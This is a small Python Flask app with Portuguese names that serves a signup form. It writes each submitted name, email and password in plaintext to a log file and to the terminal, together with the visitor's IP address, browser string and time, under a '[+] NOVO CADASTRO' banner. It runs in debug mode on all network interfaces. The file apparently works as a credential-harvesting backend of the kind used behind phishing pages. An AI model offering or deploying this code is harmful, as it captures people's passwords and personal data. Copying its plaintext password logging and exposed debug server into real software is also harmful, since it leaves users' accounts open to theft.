from flask import Flask, request, render_template
from datetime import datetime

app = Flask(__name__)

@app.route("/", methods=["GET"])
def formulario():
    return render_template("cadastro.html")

@app.route("/salvar", methods=["POST"])
def salvar_dados():
    nome = request.form.get("nome", "")
    email = request.form.get("email", "")
    senha = request.form.get("senha", "")
    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent")
    hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    log = (
        f"{hora} | IP: {ip} | Navegador: {user_agent} | "
        f"Nome: {nome} | Email: {email} | Senha: {senha}"
    )

    # Salvar no arquivo
    with open("logs.txt", "a") as f:
        f.write(log + "\n")

    # Mostrar no terminal
    print("[+] NOVO CADASTRO:")
    print(log)
    print("-" * 60)

    return "Cadastro recebido com sucesso!"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)